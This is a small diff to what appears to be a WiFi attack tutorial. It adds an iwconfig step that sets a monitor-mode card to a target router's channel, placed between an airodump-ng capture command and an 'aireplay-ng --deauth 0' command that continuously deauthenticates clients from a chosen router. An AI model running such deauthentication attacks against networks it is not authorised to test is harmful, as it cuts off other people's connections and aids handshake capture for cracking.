@@ -71,6 +71,10 @@ sudo airodump-ng wlan0mon --bssid [routers BSSID here] -c [routers channel here]
 now it shows like this. Press `ctrl+c` to stop.
 
 6. now run
+```
+iwconfig [your wifi card name in monitor mode] channel [routers channel here]
+```
+   `eg: iwconfig wlan0mon channel 2`
 
 ```
 sudo aireplay-ng --deauth 0 -a [ROUTERS BSSID HERE] wlan0mon
